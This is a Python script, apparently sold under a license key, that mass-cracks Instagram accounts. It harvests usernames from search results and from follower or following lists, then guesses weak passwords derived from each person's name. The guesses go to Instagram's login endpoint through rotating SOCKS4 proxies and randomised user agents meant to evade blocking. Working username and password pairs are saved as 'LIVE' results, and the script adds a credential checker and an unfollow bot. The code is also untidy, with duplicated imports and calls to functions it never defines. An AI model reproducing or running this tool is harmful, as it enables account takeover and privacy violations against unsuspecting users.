# coding:utf-8
#/usr/bin/python
try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
    
###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
import rich
from rich.markdown import Markdown
import os, sys, subprocess, platform
import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

try:
	import stdiomask
except ImportError:
	catet_mask = ('# • sedang menginstall modul stdiomask •')
	mask = rich.markdown.Markdown(catet_mask, style='green')
	rich.console.Console().print(mask)
	os.system('pip install stdiomask')
	
	catet_play = ('# • sedang menginstall play-audio •')
	play = rich.markdown.Markdown(catet_play, style='green')
	rich.console.Console().print(play)
	os.system('pkg install play-audio')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich import print as printer
from rich.console import Console
from rich.console import Console as sol
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
# code by Acil Xcode

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Yayan XD.
import os, sys, subprocess, platform
import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')
    
try:
	import stdiomask
except ImportError:
	catet_mask = ('# • sedang menginstall modul stdiomask •')
	mask = rich.markdown.Markdown(catet_mask, style='green')
	rich.console.Console().print(mask)
	os.system('pip install stdiomask')
	
	catet_play = ('# • sedang menginstall play-audio •')
	play = rich.markdown.Markdown(catet_play, style='green')
	rich.console.Console().print(play)
	os.system('pkg install play-audio')  

from rich.markdown import Markdown
from rich.console import Console
#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.tree import Tree
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.console import Console
from rich.table import Table
from time import sleep as slp
from os import system as cmd


import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from bs4 import BeautifulSoup
from datetime import datetime
#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.progress import track
from rich.panel import Panel
from rich.tree import Tree
from rich import print
from rich.panel import Panel
console = Console()

#---- PROGRES ------
from rich.progress import Progress
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import SpinnerColumn
from rich.progress import TimeElapsedColumn

###----------[ GLOBAL NAME ]---------- ###
ses = requests.Session()

### WARNA PRINT###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
#O = '\x1b[1;9
def folder():
	try:os.mkdir('data')
	except:pass
	try:os.mkdir('result')
	except:pass
	
    
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')
    
prox=open('.prox.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)"
# USN="Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei Social Phone Build/HWIX3) AppleWebKit/533.1 (KHTML, like Gecko) Dolphin/10.1.1005.22 Mobile Safari/533.1"

internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
s=requests.Session()
# CLEAR
def clear():
    os.system('clear')
 
###----------[ GET TIME ]---------- ###
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Morning"
	elif 12 <= hours < 15:timenow = "Good Afternoon"
	elif 15 <= hours < 18:timenow = "Good Evening"
	else:timenow = "Good Night"
	return timenow


#------------------------------->
### WARNA MODULE RICH ###
tebal  = '[b]'
merah  = '[#FF0022]'
pink   = '[#FF1493]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
white = '[#FFFFFF]'
hapus  = '[/]'
blue = '[#0000FF]'
biru_m = '[bold cyan]'
warna_rich = random.choice(["[bold red]","[deep_pink]","[blue]","[green]","[cyan]","[white]","[yellow]"])
dt = requests.get("http://ip-api.com/json/").json()
CN = dt["country"]
x = '\33[m' # DEFAULT
# Make Directory Result
try:os.mkdir("CP")
except:pass
    # Make Directory Result
try:os.mkdir("OK")
except:pass
#-------- HAPUS DATA LOGIN ------------
def clear():
	os.system('clear')
def hapus_log():
    try:os.remove(".token.txt");os.remove(".cokie.txt")
    except:pass
#-------- HAPUS HASIL DUMP --------
def hapus_dump():
    try:os.remove("results/dump.txt")
    except:pass
# ------- UNTUK MENGHAPUS TEKS --------
def hapus_teks():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass    
def back():
	login()    
#-------- LOADING ANIMASI ------------
def loading():
    animation = [f"{M}____________",f"{K}______________", f"{H}_______________", f"{B}________________"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")

###----------[ GET TIME ]---------- ###
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "good morning"
	elif 12 <= hours < 15:timenow = "good afternoon"
	elif 15 <= hours < 18:timenow = "good evening"
	else:timenow = "good night"
	return timenow    
reset = "[/]"
###----------[ LOGO ]---------- ###
def banner():
    os.system('clear')
    print(f""" [deep_pink3]
  _____ _   _  _____ _______        __      ______  
 |_   _| \ | |/ ____|__   __|/\     \ \    / /___ \ 
   | | |  \| | (___    | |  /  \     \ \  / /  __) |
   | | | . ` |\___ \   | | / /\ \     \ \/ /  |__ < 
  _| |_| |\  |____) |  | |/ ____ \     \  /   ___) |
 |_____|_| \_|_____/   |_/_/    \_\     \/   |____/ 
                                                    
                                                    """)

try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus
 

def key():
	os.system('clear')
	banner()
	masuk = input(f'{N}MASUKAN LISENSI JIKA BELUM PUNYA KETIK OPEN/open\n{H} LISENSI : ')
	loading()
	if masuk in ['open','OPEN','Open','oPEN']:
		os.system("xdg-open https://wa.me/6283862287464?=text=asslamulaikum,+bang+ridwan+ganteng+mau+buy+lisensi+instagaram+dong")
	#	print(f'JIKA TIDAK DI ARAH KAN KE NO WA SILAKAN CHET NO 083862287464!')
	elif masuk in ['STGR-TTBC-UUAY-JJAJ']:
		cetak(nel(f'[white]SELAMAT LISENSI ANDA TERDAFTAR SECEPET MUNGKIN AKAN DI ARIHKAN KE MENU LOGIN!'))
		login_kamu()
	else:
		cetak(nel(f'lisensi tidak terdaftar'))
		key()
try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus
 


def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()

    return external,user

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            prints(Panel(f'{merah}1. {hijau}login menguna kan cookiees dan username ',title=f'{merah} PILIH CARA ANDA LOGIN'))
          #  io = '[1] Login Menggunakan Cookie\n[2] Login Menggunakan Username & Password'
           # oi = nel(io, style='cyan')
          #  cetak(nel(oi, title='Pilih Cara Kamu Login'))
            loginpil=input(f"INPUT:{C} ")
            os.system('clear')
            if loginpil=='1':
        #        wel = '# Gunakan username dan cookies instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
            #    wel2 = mark(wel, style='red')
           #     sol().print(wel2)
                us=input(f'{CY}[•] Masukan Username :{C}')
                cok=input(f'{CY}[•] Masukan Cookie :{C}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                print(f"{H} LOGIN SUKSES TUNNGU SEBENTAR")
          #      print(f"{M} python.run.py")
                sleep(2.3)
                os.system("clear")
            elif loginpil == '2':
                login()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        login()
def login():
    global external
    try:
        wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        us=input(f"{CY}[•] Masukan username: {C}")
        pw=stdiomask.getpass(prompt=f'{CY}[•] Masukan password: {C}')
    except KeyboardInterrupt:
        wel = '# KeyboardInterrupt terdeteksi... keluar !'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        exit()
    x=instagramAPI(us,pw).loginAPI()
    if x.get('status')=='success':
        open('.username','a').write(us)
        open('.kukis.log','a').write(x.get('cookie'))
        cookie={'cookie':x.get('cookie')}
        print(f'\n{H}>{C} Login berhasil')
        os.system('python run.py')
    elif x.get('status')=='checkpoint':
        wel = '# Login checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        login()
    else:
        wel = '# Username atau password yang anda masukan salah'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        login()


class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            welcome=f'''[{H}•{C}]NAMA AKUN TB LU└── {nama}'''
            print(welcome)
            print(f'{H}[01]└── CRAK DARI PENCARIN NAME\n[02]└── CRAK DARI PENGIKUT\n[03]└── CRAK DARI MENGIKUTI\n[04]└── CHEK OPSI CHEKPOINT\n[05]└── CHEK HASIL CRAK\n[R]└── LAPOR BUG\n[E]└── EXIT/hapus kuki')
          #  io='[01] Crack Dari Pencarian\n[02] Crack Dari Pengikut\n[03] Crack dari Mengikuti\n[04] Check Status Crack \n[05] Lihat Hasil Crack\n[06] Bot Auto Unfollow\n[R] Laporkan Bug\n[C] Changelog\n[E] Exit'
          #  oi = nel(io, style='green')
         #   cetak(nel(oi, title='MENU'))


    def BUG(self):
        bug=f'KICK LINK DI BAWAH INI UNTUK MELAPOR BUG\nhttps://wa.me/+6283862287464'
        bug1 = nel(bug, style='green')
        cetak(nel(bug1, title='REPORT BUG'))
        exit()

    def ChangeLog(self):
        io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fitur yang di update'))

        io='[1] Bot unfollow instagram\n[2] Bot spam komen'
        oi = nel(io, style='cyan')
        cetak(nel(oi, title='Fitur tambahan'))

        io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fix Bug'))
        exit()

    def Exit(self):
        kel='# Apakah anda yakin ingin keluar ?'
        kel1=mark(kel,style='red')
        sol().print(kel1)
        x=input(f'\n{CY}[•] Jawaban [y/t] : {C}')
        if x in ('y','Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            os.system('python run.py')
        elif x in ('t','T'):
            os.system('python run.py')
        else:
            self.Exit()

    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid

    def unfollowAPI(self,user_id,username_id,cookie):
        uuid=generateUUID(True)
        xx=self.s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
        s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})

        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


    def searchAPI(self,cookie,nama):
        try:
            x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                user=i['user']
                username=user['username']
                fullname=user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
        return internal

    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"\n{M}┣[!] Koneksi internet bermasalah{C}")
            except Exception as e:
                exit(f"\n{M}┣[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
            return idx
        else:lisensi()

    def infoAPI(self,cookie,api,id):
        if 'sukses' in  lisensiku:
            try:
                bkp=f'# SEDANG MENGUMPULKAN USERNAME HARAP TUNNGU'
                bkp1=mark(bkp,style='blue')
                sol().print(bkp1)
                x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
                x_jason=json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid=x_jason['next_max_id']
                    for z in range (9999):
                        x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
                        x_jason=json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                 maxid=x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:pass
            except requests.exceptions.ConnectionError:
                exit(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
            except Exception as e:
                print(f'\n{M} Username yang anda masukan tidak di temukan{C}')
            return internal
        else:lisensi()

    def passwordAPI(self,xnx):
        idtar=f'# BERHASIL TERKUMPUL→  : {len(internal)} [•]'
        idtar1=mark(idtar,style='green')
        sol().print(idtar1)
        pilpass='# Pilihan Kombinasi Password'
        pilpass1=mark(pilpass,style='green')
        sol().print(pilpass1)
        komb='[1]└── NAMA123\n[02]└── NAMA1234\n[03]└── NAMA1235\n[04]└── SANDI MANUAL'
        komb1 = nel(komb, style='red')
        cetak(nel(komb1))
        c=input(f'{CY}CHOICE :{C} ')
        if c=='1':
            self.generateAPI(xnx,c)
        elif c=='2':
            self.generateAPI(xnx,c)
        elif c=='3':
            self.generateAPI(xnx,c)
        elif c=='7':
            self.generateAPI(xnx,c)
        elif c=='4':
            ui='# PASSWORD MANUAL'
            uu=mark(ui,style='')
            sol().print(uu)
            print(f'{M} Contoh sayang,anjing,bangsat')
            print('')
            zx=input(f'{CY}[•] List password :{C} ')
            self.generateAPI(xnx,c,zx)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self,user,o,zx=''):
        global prog,des
        prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('',total=len(internal))
   #     io=f'[•] Hasil OK disimpan ke: result/{day}.txt\n[•] Hasil CP disimpan ke: result/{day}.txt'
      #  oi = nel(io, style='green')
       # cetak(nel(oi, title='CRACK READY'))
      #ipku='# [•] If the IP address is spammed, turn on airplane mode for 10 seconds'
      #  ipku1=mark(ipku,style='red')
     #   sol().print(ipku1)
        with prog:
            with ThreadPoolExecutor(max_workers=15) as shinkai:
                for i in user:
                    try:
                        username=i.split("|")[0]
                        password=i.split("|")[1].lower()
                        for w in password.split(" "):
                            if len(w)<3:
                                continue
                            else:
                                w=w.lower()
                            if o=="1":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234']
                                else:
                                    sandi=[w]
                            elif o=="2":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                                else:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                            elif o=="3":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,password.lower()]
                                else:
                                    sandi=[w+'123',w,password.lower()]
                            elif o=="7":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234',w+'12345',w]
                                else:
                                    sandi=[w+'123',w+'1234',w+'12345',password.lower()]
                            elif o=="4":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI,username,sandi)
                    except:
                        pass
        print('\n')
        oi='# CRACK SELESAI'
        io=mark(oi,style='yellow')
        sol().print(io)
        exit()

    def APIinfo(self,user):
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass

        return nama,pengikut,mengikut,postingan

    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        prog.update(des,description=f"[💻] {str(loop)}/{len(internal)}{H} OK : {H}{len(success)}{K} CP : {K}{len(checkpoint)}{N}")
        prog.advance(des)
        try:
            
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip=random.choice(prox)
                proxs= {'http': 'socks4://'+nip}
                aa='Mozilla/5.0 (Linux; U; Android 6.0.1;'
                b=random.choice(['4','5','6','7','8','9','10','11','12'])
                c='zh-CN; Redmi 3S Build/MMB29M)'
                d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                e=random.randrange(1, 999)
                f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.5.5.943'
                h=random.randrange(73,100)
                i='0'
                j=random.randrange(4200,4900)
                k=random.randrange(40,150)
                l='Mobile Safari/537.36'
                uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                token=s.get('https://www.instagram.com/accounts/login/?next=/accounts/logout/')
                headers = {
                    'Host': 'www.instagram.com',
                    'x-ig-www-claim': '0',
					'x-instagram-ajax': '1005633336-hot',
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*',
					'x-requested-with': 'XMLHttpRequest',
					'x-asbd-id': '198387',
					'user-agent': uaku,
					'x-csrftoken': token.cookies['csrftoken'],
					'x-ig-app-id': '1217981644879628',
					'origin': 'https://www.instagram.com',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': 'https://www.instagram.com/accounts/login/?next=/accounts/logout/',
					'accept-encoding': 'gzip, deflate',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                }
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),


                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "optIntoOneTap": 'false',
                    "queryParams": "{}",
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
                if "userId" in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'[•]NAMA: {nama}\n[•]USERNAME : {user}\n[•]PASWORD : {pw}\n[•]PENGIKUT : {pengikut}\n[•]USER-AGENT:{uaku}\n[•]hasil di simpan ke live/{day}'
                    oi = nel(io, style='green')
                    print('\n')
                    cetak(nel(oi, title='LIVE'))
                    open(f"result/LIVE-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break

                elif 'checkpoint_url' in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'[•]NAMA     : {nama}\n[•]Username : {user}\n[•]PASWORD: {pw}\n[•]PENGIKUT : {pengikut}\n[•]hasil di simpan ke chek/{day}'
                    print('\n')
                    oi=nel(io,style='yellow')
                    cetak(nel(oi, title='CHEK'))
                    open(f"result/CHEK-{day}.txt","a").write(f'{user}|{pw}|{pengikut}')
                    checkpoint.append(user)
                    break

                else:
                    continue

            loop+=1
        except:
            self.crackAPI(user,pas)

    def checkAPI(self,user,pw):
        try:
            token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR3CH3q3WF_EHwNgjQj_uhjG15AF1ckFwoqU4QVfeHdOiBCT',
                'x-instagram-ajax': '82a581bb9399',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': user_agent(),
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })

            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'{nama}\n{user}\n{pw}\n{pengikut}'
                oi = nel(io, style='yellow')
                print('\n')
                cetak(nel(oi, title=' CHEK POINT'))

            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)

    def menu(self):
        self.logo()
        c=input(f' {CY}[PILIH] :{C}  ')
        if c=='':
            self.menu()
        elif c in ('1','01'):
            mas='# Masukan jumlah target'
            mas1=mark(mas,style='green')
            sol().print(mas1)
            m=int(input(f'\n{CY}[•] Jumlah : {C}'));print('')
            mas='# Masukan nama ranfom untuk di searching'
            mas1=mark(mas,style='green')
            sol().print(mas1)
            for i in range(m):
                i+1
                nama=input(f'{CY}┣[>] Masukan nama ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)

        elif c in ('2','02'):
            pr='# PASTIKAN TARGET BERSIFAT PUBLIK'
            po=mark(pr,style='red')
            sol().print(po)
            mas=input('Apakah anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                masal(self)
            elif mas in ['t','T']:
                massal(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG KENTOD!')


        elif c in ('3','03'):
            pr='# PASTIKAN TARGET BERSIFAT PUBLIK'
            po=mark(pr,style='red')
            sol().print(po)
            mas=input('Apakah anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['t','T']:
                meng(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG KENTOD!')


        elif c in ('4','04'):
            print('')
            for i in os.listdir('data'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {CY}┣>>> Masukan nama file: {C}')
            g=open("data/%s"%(c)).read().splitlines()
            print(f'\n{CY}┣[+] Total Result MASTER_FU{H}{len(g)}{C}')
            print(f'\n{CY}┣[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                self.checkAPI(usr,pwd)
            exit(f'\n\n{K}┣[#] proses check selesai...{C}')

        elif c in ('5','05'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {U}┣>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'\n{K}┣[>] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""
 [{M}+{C}] {M}𝐌𝐀𝐌𝐏𝐔𝐒 𝐂𝐄𝐊𝐏𝐎𝐈𝐓{C}:
  {M}|{C}
  {M}├╴>{C} Username: {O}{usr}{C}
  {M}├╴>{C} Password: {O}{pwd}{C}
  {M}├╴>{C} Followers: {O}{fol}{C}
  {M}├╴>{C} Following: {O}{ful}{C}
                    """);sleep(0.05)
                else:
                    print(f"""
  {H}[>]{C}{H} IBD :  LIVE {C}
  {H}[>]{C}{H} Username : {H}{usr}{C}
  {H}[>]{C}{H} Password : {H}{pwd}{C}
  {H}[>]{C}{H} Pengikut : {H}{fol}{C}
  {H}[>]{C}{H} Mengikuti : {H}{ful}{C}
                    """);sleep(0.05)
        elif c in ('6','06'):
            global following
            six=0
            print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
            x=open('.kukis.log','r').read()
            x_id=re.findall('sessionid=(\d+)',x)[0]
            back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
            for i in following:
                six+=1
                sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
                six_id=self.sixAPI(i)
                print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
                self.unfollowAPI(six_id,'5452333948',self.cookie)
                #print(w)
            input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()

        elif c in ('r','R'):
            self.BUG()
        elif c in ('c','C'):
            self.ChangeLog()
